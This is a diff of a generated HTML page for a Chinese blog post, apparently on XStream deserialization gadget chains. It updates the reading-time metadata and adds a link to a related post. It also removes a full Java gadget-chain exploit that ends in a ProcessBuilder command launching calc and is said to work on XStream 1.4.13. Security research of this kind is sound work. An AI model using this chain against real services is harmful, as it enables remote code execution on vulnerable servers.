@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    3.8k 字
+                    3.5k 字
                   </span>
                 
 
@@ -134,7 +134,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      18 分钟
+                      17 分钟
                   </span>
                 
 
@@ -452,7 +452,6 @@ HashMap hashMap = new HashMap(1);
 hashMap.put(&quot;name&quot;, &quot;Twings&quot;);
 Object[] table = (Object[])getFieldValue(hashMap, &quot;table&quot;);
 setField(table[0], &quot;key&quot;, nativeString);
-poc = nativeString;
 </code></pre>
 <p>写的有点乱，有点地方可能用 ReflectionFactory 实例化对象比较好，懒得改了。</p>
 <p>除了这条链，还有一条通过 Bcel ClassLoader 进行利用的类，不过我的环境上找不到这个 ClassLoader 了，可能是早期 JDK 版本的类4，感兴趣的可以去看看参考文章。</p>
@@ -697,47 +696,7 @@ try {
 </code></pre>
 <p>然后调用 reflectionProvider.newInstance，最后来到 unsafe.allocateInstance，<a href="https://blog.csdn.net/luoyoub/article/details/79918104" target="_blank" rel="noopener">参考文章</a>。</p>
 <p>作用跟前面用到过的 ReflectionFactory 相似，可以在不调用构造函数的情况下实例化一个类，所以 Runtime 也可以实例化出来。</p>
-<h3 id="题外话三：高版本未开启安全措施下的利用"><a href="#题外话三：高版本未开启安全措施下的利用" class="headerlink" title="题外话三：高版本未开启安全措施下的利用"></a>题外话三：高版本未开启安全措施下的利用</h3><p>确实是可以利用的，用 MultiUIDefaultsEnumerator + SequenceInputStream 代替即可，可以在最新版本 1.4.13 上利用：</p>
-<pre><code class="java">Method start = ProcessBuilder.class.getDeclaredMethod(&quot;start&quot;);
-Constructor constructor1 = Class.forName(&quot;javax.imageio.ImageIO$ContainsFilter&quot;).getDeclaredConstructors()[0];
-constructor1.setAccessible(true);
-ServiceRegistry.Filter filter = (ServiceRegistry.Filter)constructor1.newInstance(start, &quot;start&quot;);
-
-ArrayList arrayList = new ArrayList(1);
-arrayList.add(new ProcessBuilder(&quot;calc&quot;));
-Constructor constructor2 = Object.class.getDeclaredConstructor();
-constructor2.setAccessible(true);
-Constructor constructor2_2 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(Class.forName(&quot;javax.imageio.spi.FilterIterator&quot;), constructor2);
-constructor2_2.setAccessible(true);
-Object filterIterator = constructor2_2.newInstance();
-setField(filterIterator, &quot;next&quot;, new Object());
-setField(filterIterator, &quot;iter&quot;, arrayList.iterator());
-setField(filterIterator, &quot;filter&quot;, filter);
-
-Object multiUIDefaultsEnumerator = createWithoutConstructor(&quot;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&quot;);
-setField(multiUIDefaultsEnumerator, &quot;type&quot;, Class.forName(&quot;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator$Type&quot;).getEnumConstants()[0]);
-setField(multiUIDefaultsEnumerator, &quot;iterator&quot;, filterIterator);
-
-SequenceInputStream sequenceInputStream = (SequenceInputStream)createWithoutConstructor(&quot;java.io.SequenceInputStream&quot;);
-setField(sequenceInputStream, &quot;in&quot;, new ByteArrayInputStream(&quot;&quot;.getBytes()));
-setField(sequenceInputStream, &quot;e&quot;, multiUIDefaultsEnumerator);
-
-Constructor constructor4 = Class.forName(&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;).getDeclaredConstructors()[0];
-constructor4.setAccessible(true);
-Object xmlDataSource = constructor4.newInstance(&quot;Twings&quot;, sequenceInputStream);
-DataHandler dataHandler = new DataHandler((DataSource)xmlDataSource);
-Base64Data base64Data = new Base64Data();
-setField(base64Data, &quot;dataHandler&quot;, dataHandler);
-
-Constructor constructor5 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(Class.forName(&quot;jdk.nashorn.internal.objects.NativeString&quot;), Object.class.getDeclaredConstructor());
-constructor5.setAccessible(true);
-Object nativeString = constructor5.newInstance();
-setField(nativeString, &quot;value&quot;, base64Data);
-HashMap hashMap = new HashMap(1);
-hashMap.put(&quot;name&quot;, &quot;Twings&quot;);
-Object[] table = (Object[])getFieldValue(hashMap, &quot;table&quot;);
-setField(table[0], &quot;key&quot;, nativeString);
-</code></pre>
+<h3 id="题外话三：高版本未开启安全措施下的利用"><a href="#题外话三：高版本未开启安全措施下的利用" class="headerlink" title="题外话三：高版本未开启安全措施下的利用"></a>题外话三：高版本未开启安全措施下的利用</h3><p>留坑，以后有空再看。</p>
 <hr>
 <h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.anquanke.com/post/id/204314" target="_blank" rel="noopener">https://www.anquanke.com/post/id/204314</a></p>
 <p><a href="https://www.anquanke.com/post/id/172198" target="_blank" rel="noopener">https://www.anquanke.com/post/id/172198</a></p>
@@ -762,6 +721,11 @@ setField(table[0], &quot;key&quot;, nativeString);
               
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/10/13/commons-beanutils反序列化漏洞/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>commons-beanutils反序列化漏洞</span>
+                      </a>
                     
                   </div>
                   <div class="post-next col-12 col-md-6">
